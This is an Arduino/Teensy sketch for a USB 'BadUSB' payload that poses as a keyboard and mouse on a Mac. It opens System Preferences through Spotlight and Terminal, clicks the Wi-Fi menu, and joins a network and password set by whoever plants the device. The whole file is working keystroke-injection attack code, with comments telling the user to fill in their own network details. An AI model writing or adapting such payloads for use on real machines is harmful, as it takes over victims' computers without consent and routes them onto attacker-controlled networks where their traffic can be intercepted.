//TeensyWifiChangerPayload by Dave
//https://github.com/Digipup1
//Credit to samyk for snippets of code used from his usbdriveby project
int led = 13;
int ds = 500;
void setup() {
pinMode(led, OUTPUT);
  
  delay(1000);
  openapp("System Preferences");
  delay(ds);
  openapp("Terminal");
  cmd(KEY_N);
  typeln("osascript -e 'tell application \"System Events\" to set bounds of window \"System Preferences\" of application \"System Preferences\" to {0, 0, 700, 700}'");
  cmd(KEY_TAB);
  cmd(KEY_F);
  typeln("Wi-Fi");
  k(KEY_ENTER);
  delay(ds);


  #if !defined(CORE_TEENSY)
  Mouse.begin();
  #endif
  
    // Move to top left of screen
  for (int i = 0; i < 1000; i++)
  {
    Mouse.move(-10, -10);
    delay(1);
  }

  delay(500);
  
 //moving to network name selection
  Mouse.move(100, 100);
  Mouse.move(100, 28);


  delay(ds);
  Mouse.click();
  
  
  Keyboard.press(KEY_DOWN); //moving ALL the way down in case of lots
  //of available networks
  delay(3000);
  Keyboard.releaseAll();
  k(KEY_ENTER);
  typeln("iPhone (5)"); //replace with your network name
  k(KEY_ENTER); //make this a comment if you have network security
  delay(3000);

  
  typeln("passwordisrightnow"); //uncomment if needed for network
  k(KEY_ENTER); //password

  //exit out of everything
  cmd(KEY_Q);
  cmd(KEY_Q);
  
     
}



//voids from samyk
void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}


void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}


void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

void openapp(String app)
{
  cmd(KEY_SPACE); //Open spotlight
  typeln(app);
}

void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}



void loop(){
  
  //blink when finished
  digitalWrite(led, HIGH);  //Blink when done 
  delay(1000);              
  digitalWrite(led, LOW);   
  delay(1000);
  digitalWrite(led, HIGH);   
  delay(1000);               
  digitalWrite(led, LOW);    
  delay(1000); 
    }
